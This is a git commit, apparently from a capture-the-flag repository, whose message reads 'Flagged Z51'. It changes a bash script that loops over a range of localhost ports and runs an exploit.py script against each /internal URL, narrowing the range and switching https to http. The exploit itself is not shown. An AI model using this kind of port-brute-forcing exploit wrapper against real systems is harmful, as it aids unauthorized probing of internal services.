0ae68f098af5a7723d2e55e082004e3d29ddd7b6
Nicolas PICARD <nicolaspicard@protonmail.com>
2019-10-17 00:49:13 +0200

    Flagged Z51

--- web/z51token/brute.sh
+++ web/z51token/brute.sh
@@ -1,8 +1,9 @@
 #!/bin/bash
 
-for i in `seq 8112 65535`
+#for i in `seq 8112 65535`
+for i in `seq 4000 4500`
 do
-	url="https://localhost:$i/internal"
+	url="http://localhost:$i/internal"
 	#echo "[-] Testing $url"
 	./exploit.py $url
 done
